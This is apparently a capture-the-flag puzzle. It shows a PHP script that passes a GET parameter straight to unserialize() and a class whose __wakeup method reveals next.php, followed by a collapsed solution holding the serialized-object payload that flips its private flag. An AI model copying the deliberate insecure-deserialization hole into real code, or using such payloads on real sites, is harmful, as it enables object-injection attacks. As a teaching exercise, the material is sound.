```php
# Try to get the next.php

<?php
class reviving_neo {
    private $dead = true;

    function __wakeup() {
        if ($this->dead == false) {
            require_once("next.php");
            die($next);
        }
    }
}

if (isset($_GET["code"])) {
    unserialize($_GET["code"]);
}

?>
```

<details>
  <summary><b>Exploite</b></summary>

  ```text
we should make the dead variable false :

code=O:12:"reviving_neo":1:{s:4:"dead";b:0;}
  ```
</details>
